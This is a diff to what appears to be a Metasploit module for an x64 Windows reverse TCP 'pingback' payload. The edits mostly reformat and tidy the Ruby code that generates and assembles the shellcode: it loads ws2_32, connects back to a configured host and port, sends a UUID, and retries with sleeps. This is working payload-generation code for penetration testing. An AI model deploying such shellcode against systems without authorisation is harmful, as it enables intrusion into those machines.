@@ -26,20 +26,17 @@ module MetasploitModule
       'Arch'          => ARCH_X64,
       'Handler'       => Msf::Handler::ReverseTcp,
       'Session'       => Msf::Sessions::Pingback
-      ))
+    ))
     def generate_stage
       # 22 -> "0x00,0x16"
       # 4444 -> "0x11,0x5c"
-      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
-
-      encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
-      retry_count  = [datastore['ReverseConnectRetries'].to_i, 1].max
+      encoded_port = [datastore['LPORT'].to_i, 2].pack("vn").unpack("N").first
+      encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || "127.127.127.127").unpack("V").first
+      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
+      retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
       pingback_count = datastore['PingbackRetries']
       pingback_sleep = datastore['PingbackSleep']
-
-      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
-
-      self.pingback_uuid ||= self.generate_pingback_uuid
+      self.pingback_uuid ||= generate_pingback_uuid
       uuid_as_db = "0x" + self.pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
 
       asm = %Q^
@@ -149,7 +146,7 @@ module MetasploitModule
           mov r14, 'ws2_32'
           push r14                ; Push the bytes 'ws2_32',0,0 onto the stack.
           mov r14, rsp            ; save pointer to the "ws2_32" string for LoadLibraryA call.
-          sub rsp, #{408+8}       ; alloc sizeof( struct WSAData ) bytes for the WSAData
+          sub rsp, #{408 + 8}     ; alloc sizeof( struct WSAData ) bytes for the WSAData
                                   ; structure (+8 for alignment)
           mov r13, rsp            ; save pointer to the WSAData structure for WSAStartup call.
           mov r12, #{encoded_host_port}
@@ -171,7 +168,7 @@ module MetasploitModule
         ; stick the retry count on the stack and store it
           push #{retry_count}     ; retry counter
           pop r14
-          push #{(pingback_count)}
+          push #{pingback_count}
           pop r15
 
         create_socket:
@@ -237,14 +234,13 @@ module MetasploitModule
             test r15, r15         ; check pingback retry counter
             jz exitfunk           ; bail if we are at 0
             dec r15               ;decrement the pingback retry counter
-            push #{(pingback_sleep*1000).to_s}            ; 10 seconds
+            push #{(pingback_sleep * 1000)}            ; 10 seconds
             pop rcx               ; set the sleep function parameter
             mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
             call rbp              ; Sleep()
             jmp create_socket     ; repeat callback
         ^
       end
-
       asm << %Q^
         exitfunk:
           pop rax               ; won't be returning, realign the stack with a pop
@@ -252,15 +248,8 @@ module MetasploitModule
           pop rcx               ; set the exit function parameter
           mov r10, 0x56a2b5f0
           call rbp              ; ExitProcess(0)
-
       ^
-      asm
-
-    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
-
+      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
+    end
   end
-  def include_send_pingback
-    true
-  end
-end
 end
